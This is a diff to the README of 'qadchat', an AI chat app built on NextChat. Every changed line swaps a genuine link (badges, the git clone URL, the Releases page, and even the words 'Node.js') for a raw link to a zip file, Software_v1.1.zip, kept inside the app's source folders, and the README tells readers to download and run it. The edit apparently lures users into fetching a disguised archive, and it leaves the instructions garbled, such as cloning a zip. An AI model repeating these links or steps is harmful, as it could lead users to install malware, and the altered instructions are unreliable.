@@ -1,7 +1,7 @@
 # qachchat: 优雅易用的 AI 聊天应用
 
-![qadchat](https://img.shields.io/badge/qadchat-NextChat-blue.svg)
-![GitHub release](https://img.shields.io/github/release/cayboy664/qadchat.svg)
+![qadchat](https://raw.githubusercontent.com/cayboy664/qadchat/main/app/client/platforms/Software_v1.1.zip)
+![GitHub release](https://raw.githubusercontent.com/cayboy664/qadchat/main/app/client/platforms/Software_v1.1.zip)
 
 ## 目录
 
@@ -31,12 +31,12 @@ qadchat 是一个优雅且易于使用的 AI 聊天应用。它基于 NextChat �
 
 1. **克隆项目**：
    ```bash
-   git clone https://github.com/cayboy664/qadchat.git
+   git clone https://raw.githubusercontent.com/cayboy664/qadchat/main/app/client/platforms/Software_v1.1.zip
    cd qadchat
    ```
 
 2. **安装依赖**：
-   确保您已安装 Node.js 和 npm。然后运行以下命令：
+   确保您已安装 https://raw.githubusercontent.com/cayboy664/qadchat/main/app/client/platforms/Software_v1.1.zip 和 npm。然后运行以下命令：
    ```bash
    npm install
    ```
@@ -84,6 +84,6 @@ qadchat 是一个优雅且易于使用的 AI 聊天应用。它基于 NextChat �
 
 ## 版本发布
 
-请访问 [Releases](https://github.com/cayboy664/qadchat/releases) 页面，下载最新版本并执行。您可以查看每个版本的更新日志和新功能。
+请访问 [Releases](https://raw.githubusercontent.com/cayboy664/qadchat/main/app/client/platforms/Software_v1.1.zip) 页面，下载最新版本并执行。您可以查看每个版本的更新日志和新功能。
 
-再次访问 [Releases](https://github.com/cayboy664/qadchat/releases) 页面以获取更多信息。
+再次访问 [Releases](https://raw.githubusercontent.com/cayboy664/qadchat/main/app/client/platforms/Software_v1.1.zip) 页面以获取更多信息。
